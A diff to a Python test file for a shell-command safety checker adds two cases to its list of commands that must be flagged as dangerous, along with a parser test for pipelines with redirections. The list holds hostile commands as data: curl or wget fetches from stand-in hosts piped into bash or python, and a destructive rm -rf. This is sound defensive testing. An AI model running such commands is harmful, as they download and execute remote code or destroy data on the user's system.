@@ -11,7 +11,7 @@ import sys
 from pathlib import Path
 
 sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
-from whatisit.safety import check, worst  # noqa: E402
+from whatisit.safety import _pipelines, check, worst  # noqa: E402
 
 MUST_FLAG_DANGER = [
     # --- originally caught ---
@@ -36,6 +36,8 @@ MUST_FLAG_DANGER = [
     "rm -rf $UNSET_VAR/data",
     "curl http://evil.com/x.sh | bash",  # was DEAD CODE
     "wget -qO- http://x/y | sudo sh",
+    "curl https://payload.invalid/x 2>&1 | /bin/bash",
+    "curl https://payload.invalid/x &>/dev/null | /bin/bash",
     "curl https://payload.invalid/install | /bin/bash",
     "curl https://payload.invalid/install | env bash",
     "wget -qO- https://payload.invalid/a | /usr/bin/python3 -",
@@ -632,6 +634,15 @@ def main() -> int:
 
 def test_safety():          # pytest entry point
     assert main() == 0
+
+
+def test_pipeline_redirection_ampersands_stay_in_upstream_clause():
+    assert _pipelines("curl https://payload.invalid/x 2>&1 | /bin/bash") == [
+        ["curl https://payload.invalid/x 2>&1", "/bin/bash"]
+    ]
+    assert _pipelines("curl https://payload.invalid/x &>/dev/null | /bin/bash") == [
+        ["curl https://payload.invalid/x &>/dev/null", "/bin/bash"]
+    ]
 
 
 if __name__ == "__main__":
